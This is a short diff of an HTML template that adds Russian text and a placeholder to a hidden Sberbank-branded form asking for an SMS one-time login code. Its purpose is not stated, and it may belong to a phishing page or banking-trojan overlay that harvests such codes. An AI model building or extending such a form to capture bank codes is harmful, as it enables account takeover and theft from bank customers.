@@ -18,8 +18,11 @@
 </div>
 <div class="verification-form hidden">
     <img class="logo" src="sberbank-logo.svg" />
+    <div class="description">
+        На ваш телефон был отправлен одноразовый код для входа в личный кабинет Сбербанк Онлайн.
+    </div>
     <div class="title login">Код подтверждения</div>
-    <input id="verification-code" class="entry login" type="number" pattern="[0-9]*" />
+    <input id="verification-code" placeholder="Введите код подтверждения из SMS" class="entry login" type="number" pattern="[0-9]*" />
     <div class="error-message">Неверный код</div>
     <button id="verify-button" class="button-success">Продолжить</button>
     <button class="button-link">Отменить</button>
